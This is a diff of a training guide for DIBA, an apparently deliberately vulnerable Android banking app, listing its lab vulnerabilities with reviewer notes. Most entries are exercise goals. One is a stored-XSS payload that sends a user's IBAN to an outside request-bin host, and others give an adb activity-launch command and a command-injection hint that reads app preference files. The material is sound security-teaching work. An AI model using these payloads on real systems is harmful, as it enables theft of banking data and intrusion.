@@ -85,11 +85,13 @@ Apps should never log sensitive data as this unnecessarily exposes this data so 
 **Check**: Works
 
 ### 9: Exported Activity Alias (easy/medium)
-The activity to view the investments in not exported. However, there's an alias for this activity, which is exported, and as a result of this, the original activity also gets exported. This means that it can be directly accessed without following the user interface of the app, i.e., without logging in. Note that in this case, assming an attacker gets temporary access to the device of a DIBA user that is currently not logged is not really beneficial as no investments will be shown. However, there are certainly apps where such a vulnerability may provide access to more interesting functionality or data and the main intention of the vulnerability is to demonstrate that an activity can be unintentionally made exportable if the developer uses activity aliases in a wrong way. 
+The activity to view the investments in not exported. However, there's an alias for this activity, which is exported, and as a result of this, the original activity also gets exported. This means that it can be directly accessed without following the user interface of the app, i.e., without logging in. 
 
 **Goal (easy):** Without being logged into the DIBA app, use adb to directly start and access the activity to view the investments.
 
 **Goal (medium):** Develop an app that starts the investment activity without being logged into the DIBA app.
+
+**Remark**: Note that in this case, assming an attacker gets temporary access to the device of a DIBA user that is currently not logged is not really beneficial as no investments will be shown. However, there are certainly apps where such a vulnerability may provide access to more interesting functionality or data and the main intention of the vulnerability is to demonstrate that an activity can be unintentionally made exportable if the developer uses activity aliases in a wrong way.
 
 **Check**: Works
 
@@ -116,7 +118,7 @@ During payment, DIBA allows to load/save a payment slip from/to the SD-Card. Thi
 ### 12: Directory Traversal III - Read/Write (easy)
 This uses the same vulnerability as vulnerability 11 and is only intended to show that data can also be copied to locations so it can be access by other apps.
 
-**Goal:** Abuse the load/save payment slip functionality to copy any file from the shared preferences to the SD-Card. Once this has been done, check (e.g. using adb) whethter the file was indeed copied to the SD-Card.
+**Goal:** Abuse the load/save payment slip functionality to copy any file from the shared preferences to the SD-Card. Once this has been done, check (e.g., using adb) whether the file was indeed copied to the SD-Card.
 
 **Check**: Works
 
@@ -129,10 +131,10 @@ At the top right of the *Home* screen, thers's a bug-shaped button. Clicking thi
 
 Note: Code is obfuscated and hard to learn. However, looking at the encrypted report, one can also guess that a Vigenere cipher is used. So no need to analyze the obfuscated code to find out what is going on. This should also be stated in the solution chapter.
 
-### 14: Login Mimic (easy)
+### 14: JWT Validity (easy)
 If login is successful, the DIBA server sends a JSON Web Token (JWT) to the app, which is then included in every subsequent request by the app to link the request to the authenticated user. While JWTs in general are considered secure assuming they are used correctly, it's also possible to use them in an insecure way - which is what happened in DIBA.
 
-**Goal:** Get a JWT (e.g., by using an intercepor proxy) and analyse it's content (e.g., by using https://jwt.io). Identify one major problem with the content of the token and what the security implications are.
+**Goal:** Get a JWT (e.g., by using an intercepor proxy) and analyze it's content (e.g., by using https://jwt.io). Identify one major problem with the content of the token and what the security implications are.
 
 **Check**: Works
 
@@ -144,11 +146,7 @@ Some screens of the DIBA app contain sensitive information. Therefore, the app w
 
 **Check**: Works
 
-### 16:
-
-This number is missing from the solution chapter => not existing (?)
-
-### 17: Back Button Log Clearing (easy)
+### 16: Back Stack Clearing (easy)
 Usually, the back button shows the previously used screen. This can be security critical in some situation. E.g., in the DIBA app, after a user has logged out, it should not be possible to use the back button to get access to previously used screens as they may reveal sensitive information to anotehr user who gets access to the device. The DIBA app has two log out functionalitis, one via the menu on the top left and the other via the home screen. Only one of the is implemented ion a secure way.
 
 **Goal:** Find a way such that - after logging out - sensitive information can be accessed by using the back button.
@@ -158,13 +156,13 @@ Usually, the back button shows the previously used screen. This can be security 
 Sequence: Login - Payments - Home - Log-out/Side Drawer - back - back => PAYMENTS!
 
 
-### 18: Input validate in make payment activity
+### 17: Payment Input Validation (easy)
 
 Check this out. I also sent you a video as there's a strange behaviour with payments if the proxy is used. It may have to do with timeouts in the app?
 
 https://drive.switch.ch/index.php/s/av94lsXfhJkPjwX
 
-### 19: Developer entrance (medium)
+### 18: Developer Entrance (medium)
 As a leftover from development to make testing easier, a backdoor was added to the login screen that allows to tap on the DIBA logo to get access to the authenticated area without having to log in. The developers deactivated the backdoor, but it was simply deactivated using a flag in the code and the actual code was left in. This means an attacker can easily reactivate the backdoor.
 
 **Goal:** Adapt the app so that the backdoor is working again so the logo can be tapped to enter the authenticated are.
@@ -175,39 +173,39 @@ As a leftover from development to make testing easier, a backdoor was added to t
 
 **Check**: Works
 
-### 20: App Backup (medium)
+### 19: App Backup (medium)
 In the file *AndroidManifest.xml* that is part of every app, the developer can specify whether backups via adb are allowed. In the case of the DIBA apps, backups are permitted. This is convenient, but introduces risks, as it allows the user to easily change some setting that shouldn't directly be accessible to the user and if an attacker manages to get access to a backup, he may get access to sensitive information.
 
 **Goal:** Do a backup of the DIBA app via adb and inspect the backed up data to learn what it contains in general and whether it contains sensitive data.
 
 **Check**: Works
 
-### 21: Fragment injection
+### 20: Fragment injection
 
 I don't undersdtand this one.
 
 Using the followong when not being logged in crashes the app:
 am start -n "ch.zhaw.securitylab.dibach.zhaw.securitylab.diba.activity.unauth.ActivityCredentials" -e credentials_fragment ch.zhaw.securitylab.diba.activity.unauth.FragmentChange
 
-### 22: Insecure services
+### 21: Insecure services
 
 TBD
 
-### 23: Weak JWT MAC Secret (medium)
+### 22: Weak JWT MAC Secret (medium)
 The JSON Web Token (JWT) that is created by the DIBA server uses a weak secret for the MAC. If an attacker manages to find this secret, he can create valid JWTs for DIBA.
 
 **Goal:** Get a JWT (e.g., by using an intercepor proxy) and crack the MAC password.
 
 **Check**: Works
 
-### 24: Exploitimg Saved Foreign Login Credentials (easy)
+### 23: Exploitimg Someone Elses Stored Login Credentials (easy)
 The DIBA app allows to store the credentials using the *Remember Me* functionality. This directly implies that if a user stores the credentials and if an attacker gets access to the device, the attacker can log in and can use the app with the identity of the user.
 
 **Goal:** Log in using the credentials that have been entered and stored before (using the *Remember Me* functionality) and use the app with identity of the corresponding user. Obviously, this is trivial to do.
 
 **Check**: Works
 
-### 25: SQLite Database (medium)
+### 24: SQLite Database (medium)
 Android apps can use internal SQlite databases. The DIBA app, for instance, uses such a database to store the made inbvestments for convenience so that they do not have to be read from the server whenever the user wants to view the made investments. If an attacker gets access to the device, however, he can get the database and read its potentially sensitive content.
 
 **Preparation:** Make at least one investment so that the database contains some content.
@@ -216,7 +214,7 @@ Android apps can use internal SQlite databases. The DIBA app, for instance, uses
 
 **Check**: Works
 
-### 26: Native Language Library (hard)
+### 25: Native Language Library (hard)
 Vulnerability 27 (Encrypted SQLite Database) uses an encrypted database to locally store the made payments. The key that used for encryption is hidden in the app.
 
 **Goal:** Find the key. When solving vulnerability 27, you'll learn whethter you have found the right key.
@@ -228,7 +226,7 @@ Find where the payment database is created.
 find . -type f -exec grep -i paymentdb {} +
 => This is not so obvious. Why paymentdb?
 
-### 27: Encrypted SQLite database (hard)
+### 26: Encrypted SQLite Database (hard)
 Just like with investments (see vulnerability 25), a local database is also used to store the made payments. This time, the developers tried to come up with a more secure solution by encrypting the database with a key hidden in the app. However, assuming an attacker finds this key and gets access to the device, he can still get the database and read its potentially sensitive content.
 
 **Preparation:** Make at least one payment so that the database contains some content. Also, first exploit vulnerability 26 to get the hidden key.
@@ -239,7 +237,7 @@ Just like with investments (see vulnerability 25), a local database is also used
 
 **Check**: Could not test as I couldn't build SQLCipher
 
-### 28: WebView Cross-Site Scripting (medium)
+### 27: WebView Cross-Site Scripting (medium)
 The DIBA app provides a survey to banking customers so they can provide some feedback. This survey is implemented using a WebView that contains a stored Cross-Site Scripting (XSS) vulnerability.
 
 **Goal:** Exploit the vulnerability so that whenever a user opens the survey screen, his IBAN (which is included at the top of the screen) is sent in a request to a host controlled by the attacker.
@@ -254,13 +252,13 @@ new Image().src = encodeURI("https://postb.in/1589184632761-8206421809736?iban="
 </script>
 
 
-### 29: Cracking Weak Password
+### 28: Cracking Weak Password
 
 Uses no salt, right?
 
 What is the correct password?
 
-### 30: Root Detection Bypass (hard)
+### 29: Root Detection Bypass (hard)
 The DIBA app cointains a simple root detection mechanism. Whenever the app is started, it checks whether the Android device is rooted and displays a message if this is the case. In reality, the app would be now terminated to prevent its usage on rooted (and therefore less secure) devices. However, as a user has full control over the app, he can adapt it by removing the root detection check and as a result of this, the app can also be used on rooted devices.
 
 **Goal:** Adapt the app and remove the rooted detection check. As a result of this, the message after starting the app should no longer appear.
@@ -275,7 +273,7 @@ Question: This is a real rooted detection check, right? So it runs only on truly
 
 Note: Rooted detection should be OFF in the settings per default. Also, it should be in the Meta-Setting, not the Settings (?)
 
-### 31: Local Command Injection
+### 30: Local Command Injection
 In the Meta-Settings, there's a *Ping Server* functionality to ping the server using the configured IP address. This uses the *ping* command in the Android operating system. The output of the ping command can be seen in the Android log. This functionality contains a command injection vulnerability that allows an attacker to execute arbitrary command in the Android system.
 
 **Goal:** Exploit the vulnerability so that the content of the file *loginPreferences.xml* in shared preferences of the DIBA app is written to the Android log.
@@ -286,7 +284,7 @@ Note: Missing / in solution: && cat data/data... should be && cat /data/data...
 
 Note: But this means the meta ssettings are now exploitable, so the entry "Non-attackable screens" is no lomger correct.
 
-### 32: Two-Factor Authentication I - Replaying Codes (easy)
+### 31: Two-Factor Authentication I - Replaying Codes (easy)
 To confirm a paymemnt, the user gets a payment confirmation code by SMS. Note that the SMS is simulated and written to the server output. This code is generated and used in an insecure way. A first problem is that it is not bound to a specific payment and that it can be used for multiple payments.
 
 **Goal:** Exploit the vulnerability by reusing the payment code of a previous payment to confirm anotehr payment. Obviously, this is trivial to do.
@@ -301,12 +299,11 @@ A confirmation code was sent to you by SMS (you can get it from to the server ou
 Enter the code to conform the payment.
 (To prove that you cracked the code generation algorithm, enter the code that will be used 2020-02-31 12:00:00. If the paymant is accepted, you have succeeded!)
 
-### 33: Two-Factor Authentication II (easy)
+### 32: Two-Factor Authentication II (easy)
 
 Note: I wanted to add a vulnerability where a MITM modifies the payment when it is sent the second time (with the code). Bt it does not work as the server still uses the anount from the foirst payment. So why is the payment data sent a second time?
 
-
-### 34: Two-Factor Authentication III - Weak Code Generation (medium)
+### 33: Two-Factor Authentication III - Weak Code Generation (medium)
 Confirmation codes should be random so an attacker cannot predict them. n the case iof DIBA, however, they are not really created in a random way, although they appear quite random when looking at them.
 
 **Goal:** Crack the confirmation code generation algorithm. If you think you have cracked it, enter the confirmation code that would be used at 2030-01-31 12:00:00 in the code field and accept the payment. If the payment is accepted, you have successfully cracked the code generation algorithm.
